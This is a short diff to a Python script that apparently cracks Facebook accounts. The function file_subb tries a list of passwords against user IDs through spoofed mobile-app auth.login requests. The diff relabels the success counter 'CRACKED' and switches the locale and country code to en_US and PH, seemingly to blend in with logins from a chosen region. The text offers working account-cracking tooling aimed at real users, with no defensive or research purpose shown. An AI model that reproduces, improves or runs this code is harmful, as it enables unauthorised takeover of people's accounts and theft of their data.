@@ -152,7 +152,7 @@ oks=[]
 cps=[]
 def file_subb(uid,pwx):
     global oks,loop,cps
-    sys.stdout.write(f"\r \033[1;35m [CHECKED]: {loop} \033[1;33m [ALIVE]: {str(len(oks))}");sys.stdout.flush()
+    sys.stdout.write(f"\r \033[1;35m [CHECKED]: {loop} \033[1;33m [CRACKED]: {str(len(oks))}");sys.stdout.flush()
     session=requests.Session()
     try:
         for ps in pwx:
@@ -173,8 +173,8 @@ def file_subb(uid,pwx):
             "meta_inf_fbmeta": "",
             "advertiser_id": str(uuid.uuid4()),
             "currently_logged_in_userid": "0",
-            "locale": "en_GB",
-            "client_country_code": "GB",
+            "locale": "en_US",
+            "client_country_code": "PH",
             "method": "auth.login",
             "fb_api_req_friendly_name": "authenticate",
             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
